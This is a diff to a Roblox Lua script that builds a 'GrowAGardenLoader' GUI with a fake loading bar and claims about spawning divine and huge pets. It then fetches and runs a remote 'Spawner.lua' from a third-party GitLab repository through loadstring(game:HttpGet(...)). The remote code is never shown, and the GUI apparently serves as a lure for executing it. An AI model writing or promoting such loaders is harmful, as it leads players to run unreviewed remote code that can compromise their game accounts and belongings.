@@ -1,16 +1,22 @@
 local TweenService = game:GetService("TweenService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
+local UIS = game:GetService("UserInputService")
 
 -- GUI Setup
 local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+screenGui.Name = "GrowAGardenLoader"
 screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
 
+-- Main Frame
 local mainFrame = Instance.new("Frame", screenGui)
-mainFrame.Size = UDim2.new(0, 600, 0, 300)
-mainFrame.Position = UDim2.new(0.5, -300, 0.5, -150)
+mainFrame.Size = UDim2.new(0, 450, 0, 250) -- Smaller, centered size
+mainFrame.Position = UDim2.new(0.5, -225, 0.5, -125)
 mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
 mainFrame.BorderSizePixel = 4
+mainFrame.Active = true
+mainFrame.Draggable = true
 
 -- RGB Border
 spawn(function()
@@ -77,8 +83,8 @@ status.TextScaled = true
 
 -- Side Info
 local sideInfo = Instance.new("TextLabel", mainFrame)
-sideInfo.Size = UDim2.new(0.4, 0, 0.3, 0)
-sideInfo.Position = UDim2.new(0.6, 0, 0.75, 0)
+sideInfo.Size = UDim2.new(0.45, 0, 0.3, 0)
+sideInfo.Position = UDim2.new(0.55, 0, 0.75, 0)
 sideInfo.BackgroundTransparency = 1
 sideInfo.Text = "PET NEEDS:\nDIVINE PETS ✓\nHUGE PETS ✓"
 sideInfo.TextColor3 = Color3.fromRGB(100, 255, 100)
@@ -99,10 +105,12 @@ task.delay(duration, function()
 	status.Text = "SCRIPT LOADED!"
 
 	-- Load external script
-	local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
-	Spawner.Load()
+	local success, result = pcall(function()
+		local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkiedarkie/dark/-/raw/main/Spawner.lua"))()
+		Spawner.Load()
+	end)
 
-	-- Optional: Remove GUI after loading
-	wait(3)
+	-- Optional: Wait a bit then remove GUI
+	wait(2)
 	screenGui:Destroy()
 end)
